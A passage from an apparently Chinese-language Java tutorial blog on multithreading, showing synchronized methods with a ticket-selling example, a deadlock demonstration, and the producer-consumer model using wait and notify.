class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Test13</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="type">MyThread6</span> <span class="variable">mt</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">MyThread6</span>();</span><br><span class="line">        <span class="keyword">new</span> <span class="title class_">Thread</span>(mt, <span class="string">&quot;票贩子A&quot;</span>).start();</span><br><span class="line">        <span class="keyword">new</span> <span class="title class_">Thread</span>(mt, <span class="string">&quot;票贩子B&quot;</span>).start();</span><br><span class="line">        <span class="keyword">new</span> <span class="title class_">Thread</span>(mt, <span class="string">&quot;票贩子C&quot;</span>).start();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img                       lazyload                     src="/images/loading.svg"                     data-src="https://mes9s0hexo.oss-cn-hangzhou.aliyuncs.com/2023-04-15-73839.jpg"                      alt="image-20220807171640649"                ></p><p>​    加入同步处理之后，程序的整体的性能下降了。同步实际上会造成性能的降低。</p><p>​    2、利用同步方法解决：只需要在方法定义上使用 synchronized 关键字即可。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> three;</span><br><span class="line"></span><br><span class="line"><span class="comment">//利用同步方法解决数据同步访问问题</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">MyThread6</span> <span class="keyword">implements</span> <span class="title class_">Runnable</span> &#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="type">int</span> <span class="variable">ticket</span> <span class="operator">=</span> <span class="number">10</span>; <span class="comment">//总票数10张</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">synchronized</span> <span class="type">boolean</span> <span class="title function_">sale</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="built_in">this</span>.ticket &gt; <span class="number">0</span>) &#123;</span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                Thread.sleep(<span class="number">100</span>); <span class="comment">//模拟网络延迟</span></span><br><span class="line">            &#125; <span class="keyword">catch</span> (InterruptedException e) &#123;</span><br><span class="line">                e.printStackTrace();</span><br><span class="line">            &#125;</span><br><span class="line">            System.out.println(Thread.currentThread().getName() + <span class="string">&quot;卖票,ticket = &quot;</span> + <span class="built_in">this</span>.ticket--);</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            System.out.println(<span class="string">&quot;********票已经卖光了*********&quot;</span>);</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">run</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">while</span> (<span class="built_in">this</span>.sale()) &#123;</span><br><span class="line">            ;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Test13</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="type">MyThread6</span> <span class="variable">mt</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">MyThread6</span>();</span><br><span class="line">        <span class="keyword">new</span> <span class="title class_">Thread</span>(mt, <span class="string">&quot;票贩子A&quot;</span>).start();</span><br><span class="line">        <span class="keyword">new</span> <span class="title class_">Thread</span>(mt, <span class="string">&quot;票贩子B&quot;</span>).start();</span><br><span class="line">        <span class="keyword">new</span> <span class="title class_">Thread</span>(mt, <span class="string">&quot;票贩子C&quot;</span>).start();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img                       lazyload                     src="/images/loading.svg"                     data-src="https://mes9s0hexo.oss-cn-hangzhou.aliyuncs.com/2023-04-15-073840.jpg"                      alt="image-20220807171554157"                ></p><p>​    在日后学习 Java 类库的时候会发现，系统中许多的类上使用的同步处理采用的都是同步方法。</p><h4 id="线程死锁"><a href="#线程死锁" class="headerlink" title="线程死锁"></a>线程死锁</h4><p>​    死锁是在进行多线程同步的处理之中有可能产生的一种问题，<strong>所谓的死锁指的是若干个线程彼此互相等待的状态</strong>。下面通过简单的代码来观察一下死锁的表现形式，但是对于此代码不作为重点。</p><p>范例：死锁的原理展示</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> three;</span><br><span class="line"></span><br><span class="line"><span class="comment">//线程死锁</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Jian</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">synchronized</span> <span class="keyword">void</span> <span class="title function_">say</span><span class="params">(XiaoQiang xq)</span> &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;此路是我开，给钱&quot;</span>);</span><br><span class="line">        xq.get();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">synchronized</span> <span class="keyword">void</span> <span class="title function_">get</span><span class="params">()</span> &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;拿到钱了，让出了路&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">XiaoQiang</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">synchronized</span> <span class="keyword">void</span> <span class="title function_">say</span><span class="params">(Jian jj)</span> &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;让我走了给你钱&quot;</span>);</span><br><span class="line">        jj.get();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">synchronized</span> <span class="keyword">void</span> <span class="title function_">get</span><span class="params">()</span> &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;跑掉了，不给钱了&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Test14</span> <span class="keyword">implements</span> <span class="title class_">Runnable</span> &#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="type">Jian</span> <span class="variable">jj</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Jian</span>();</span><br><span class="line">    <span class="keyword">private</span> <span class="type">XiaoQiang</span> <span class="variable">xq</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">XiaoQiang</span>();</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">Test14</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">new</span> <span class="title class_">Thread</span>(<span class="built_in">this</span>).start();</span><br><span class="line">        xq.say(jj);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">run</span><span class="params">()</span> &#123;</span><br><span class="line">        jj.say(xq);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="keyword">new</span> <span class="title class_">Test14</span>();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img                       lazyload                     src="/images/loading.svg"                     data-src="https://mes9s0hexo.oss-cn-hangzhou.aliyuncs.com/2023-04-15-073841.jpg"                      alt="image-20220807175059746"                ></p><p>​    现在死锁造成的主要原因是因为彼此都在互相等待着，等待着对方先让出资源。死锁实际上是一种开发中出现的不确定的状态，有的时候代码如果处理不当则会不定期出现死锁，这是属于正常开发中的调试问题。</p><p>​    <strong>若干个线程访问同一资源时一定要进行同步处理，而过多的同步会造成死锁</strong>。</p><hr><h3 id="综合实战：“生产者-消费者”模型"><a href="#综合实战：“生产者-消费者”模型" class="headerlink" title="综合实战：“生产者-消费者”模型"></a>综合实战：“生产者-消费者”模型</h3><h4 id="生产者与消费者基本程序模型"><a href="#生产者与消费者基本程序模型" class="headerlink" title="生产者与消费者基本程序模型"></a>生产者与消费者基本程序模型</h4><p>​    模型具体内容：在多线程的开发过程之中最为著名的案例就是生产者与消费者操作，该操作的主要流程如下：</p><p>​    1、生产者负责信息内容的生产;</p><p>​    2、每当生产者生产完成一项完整的信息之后消费者要从这里面取走信息;</p><p>​    3、如果生产者没有生产则消费者要等待它生产完成，如果消费者还没有对信息进行消费，则生产者应该等待消费处理完成后再继续进行生产。</p><p>​    程序基本实现：可以将生产者与消费者定义为两个独立的线程类对象，但是对于现在生产的数据，可以使用如下的组成：</p><p>​    数据一: title=王建、content=宇宙大帅哥;</p><p>​    数据二: title=小高、content=猥琐第一人;</p><p>​    既然生产者与消费者是两个独立的线程，那么这两个独立的线程之间就需要有一个数据的保存集中点，那么可以单独定义一个 Message 类实现数据的保存。</p><p><img                       lazyload                     src="/images/loading.svg"                     data-src="https://mes9s0hexo.oss-cn-hangzhou.aliyuncs.com/2023-04-15-073842.jpg"                      alt="image-20220808201651459"                ></p><p>范例:程序基本结构</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> three;</span><br><span class="line"></span><br><span class="line"><span class="comment">//生产者-消费者模型</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Producer</span> <span class="keyword">implements</span> <span class="title class_">Runnable</span> &#123;</span><br><span class="line">    <span class="keyword">private</span> Message msg;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">Producer</span><span class="params">(Message msg)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.msg = msg;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">run</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">x</span> <span class="operator">=</span> <span class="number">0</span>; x &lt; <span class="number">100</span>; x++) &#123;</span><br><span class="line">            <span class="keyword">if</span> (x % <span class="number">2</span> == <span class="number">0</span>) &#123;</span><br><span class="line">                <span class="built_in">this</span>.msg.setTitle(<span class="string">&quot;王健&quot;</span>);</span><br><span class="line">                <span class="keyword">try</span> &#123;</span><br><span class="line">                    Thread.sleep(<span class="number">10</span>);</span><br><span class="line">                &#125; <span class="keyword">catch</span> (InterruptedException e) &#123;</span><br><span class="line">                    <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">RuntimeException</span>(e);</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="built_in">this</span>.msg.setContent(<span class="string">&quot;宇宙大帅哥&quot;</span>);</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="built_in">this</span>.msg.setTitle(<span class="string">&quot;小高&quot;</span>);</span><br><span class="line">                <span class="built_in">this</span>.msg.setContent(<span class="string">&quot;猥琐第一人&quot;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Consumer</span> <span class="keyword">implements</span> <span class="title class_">Runnable</span> &#123;</span><br><span class="line">    <span class="keyword">private</span> Message msg;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">Consumer</span><span class="params">(Message msg)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.msg = msg;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">run</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">x</span> <span class="operator">=</span> <span class="number">0</span>; x &lt; <span class="number">100</span>; x++) &#123;</span><br><span class="line">            System.out.println( x+<span class="built_in">this</span>.msg.getTitle() + <span class="string">&quot; - &quot;</span> + <span class="built_in">this</span>.msg.getContent());</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Message</span> &#123;</span><br><span class="line">    <span class="keyword">private</span> String title;</span><br><span class="line">    <span class="keyword">private</span> String content;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">getTitle</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> title;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setTitle</span><span class="params">(String title)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.title = title;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">getContent</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> content;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setContent</span><span class="params">(String content)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.content = content;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Test15</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="type">Message</span> <span class="variable">msg</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Message</span>();</span><br><span class="line">        <span class="keyword">new</span> <span class="title class_">Thread</span>(<span class="keyword">new</span> <span class="title class_">Producer</span>(msg)).start(); <span class="comment">//启动生产者线程</span></span><br><span class="line">        <span class="keyword">new</span> <span class="title class_">Thread</span>(<span class="keyword">new</span> <span class="title class_">Consumer</span>(msg)).start(); <span class="comment">//启动消费者线程</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img                       lazyload                     src="/images/loading.svg"                     data-src="https://mes9s0hexo.oss-cn-hangzhou.aliyuncs.com/2023-04-15-073844.jpg"                      alt="image-20220808203858585"                ></p><p>​    通过整个代码的执行你会发现此时有两个主要问题:</p><p>​        问题一:数据不同步了;</p><p>​        问题二:生产一个取走一个，但是发现有了重复生产和重复取出问题。</p><h4 id="解决数据同步"><a href="#解决数据同步" class="headerlink" title="解决数据同步"></a>解决数据同步</h4><p>​    如果要解决问题，首先解决的就是数据同步的处理问题，如果要想解决数据同步最简单的做法是使用 synchronized 关键字定义同步代码块或同步方法，于是这个时候对于同步的处理就可以直接在 Message 类中完成。</p><p>范例：解决同步操作</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> three;</span><br><span class="line"></span><br><span class="line"><span class="comment">//生产者-消费者模型</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Producer</span> <span class="keyword">implements</span> <span class="title class_">Runnable</span> &#123;</span><br><span class="line">    <span class="keyword">private</span> Message msg;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">Producer</span><span class="params">(Message msg)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.msg = msg;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">run</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">x</span> <span class="operator">=</span> <span class="number">0</span>; x &lt; <span class="number">100</span>; x++) &#123;</span><br><span class="line">            <span class="keyword">if</span> (x % <span class="number">2</span> == <span class="number">0</span>) &#123;</span><br><span class="line">                <span class="built_in">this</span>.msg.set(<span class="string">&quot;王健&quot;</span>,<span class="string">&quot;宇宙大帅哥&quot;</span>);</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="built_in">this</span>.msg.set(<span class="string">&quot;小高&quot;</span>,<span class="string">&quot;猥琐第一人&quot;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Consumer</span> <span class="keyword">implements</span> <span class="title class_">Runnable</span> &#123;</span><br><span class="line">    <span class="keyword">private</span> Message msg;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">Consumer</span><span class="params">(Message msg)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.msg = msg;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">run</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">x</span> <span class="operator">=</span> <span class="number">0</span>; x &lt; <span class="number">100</span>; x++) &#123;</span><br><span class="line">            System.out.println(x + <span class="built_in">this</span>.msg.get());</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Message</span> &#123;</span><br><span class="line">    <span class="keyword">private</span> String title;</span><br><span class="line">    <span class="keyword">private</span> String content;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">synchronized</span> <span class="keyword">void</span> <span class="title function_">set</span><span class="params">(String title, String content)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.title = title;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            Thread.sleep(<span class="number">10</span>);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (InterruptedException e) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">RuntimeException</span>(e);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="built_in">this</span>.content = content;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">synchronized</span> String <span class="title function_">get</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            Thread.sleep(<span class="number">10</span>);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (InterruptedException e) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">RuntimeException</span>(e);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">this</span>.title + <span class="string">&quot; - &quot;</span> + <span class="built_in">this</span>.content;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Test15</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="type">Message</span> <span class="variable">msg</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Message</span>();</span><br><span class="line">        <span class="keyword">new</span> <span class="title class_">Thread</span>(<span class="keyword">new</span> <span class="title class_">Producer</span>(msg)).start(); <span class="comment">//启动生产者线程</span></span><br><span class="line">        <span class="keyword">new</span> <span class="title class_">Thread</span>(<span class="keyword">new</span> <span class="title class_">Consumer</span>(msg)).start(); <span class="comment">//启动消费者线程</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img                       lazyload                     src="/images/loading.svg"                     data-src="https://mes9s0hexo.oss-cn-hangzhou.aliyuncs.com/2023-04-15-073846.jpg"                      alt="image-20220808210447031"                ></p><p>​    在进行同步处理的时候肯定需要有一个同步的处理对象，那么此时肯定要将同步操作交由 Message 类处理是最合适的。这个时候发现数据已经可以正常的保持一致了，但是对于重复操作的问题依然存在。</p><h4 id="利用Object类解决重复操作"><a href="#利用Object类解决重复操作" class="headerlink" title="利用Object类解决重复操作"></a>利用Object类解决重复操作</h4><p>​    <strong>线程等待与唤醒</strong></p><p>​    如果说现在要想解决生产者与消费者的问题，那么最好的解决方案就是使用等待与.唤醒机制，而对于等待与唤醒的操作机制，主要依靠的是 Object 类中提供的方法处理的:</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">等待机制：</span><br><span class="line">死等: <span class="keyword">public</span> <span class="keyword">final</span> <span class="keyword">void</span> <span class="title function_">wait</span><span class="params">()</span> <span class="keyword">throws</span> InterruptedException;</span><br><span class="line">设置等待时间: <span class="keyword">public</span> <span class="keyword">final</span> <span class="keyword">void</span> <span class="title function_">wait</span><span class="params">(<span class="type">long</span> timeout)</span> <span class="keyword">throws</span> InterruptedException;</span><br><span class="line">设置等待时间: <span class="keyword">public</span> <span class="keyword">final</span> <span class="keyword">void</span> <span class="title function_">wait</span><span class="params">(<span class="type">long</span> timeout, <span class="type">int</span> nanos)</span> <span class="keyword">throws</span> InterruptedException;</span><br><span class="line"></span><br><span class="line">唤醒第一个等待线程: <span class="keyword">public</span> <span class="keyword">final</span> <span class="keyword">void</span> <span class="title function_">notify</span><span class="params">()</span>;</span><br><span class="line">唤醒全部等待线程: <span class="keyword">public</span> <span class="keyword">final</span> <span class="keyword">void</span> <span class="title function_">notifyAll</span><span class="params">()</span>;</span><br></pre></td></tr></table></figure><p>​    如果此时有若干个等待线程的话，那么 notify() 表示的是唤醒第一个等待的，而其它的线程继续等待。而 notifyAll()表示醒所有等待的线程，哪个线程的优先级高就有可能先执行。</p><p>​    对于当前的问题主要的解决应该通过 Message 类完成处理。</p><p>范例：修改message类</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> three;</span><br><span 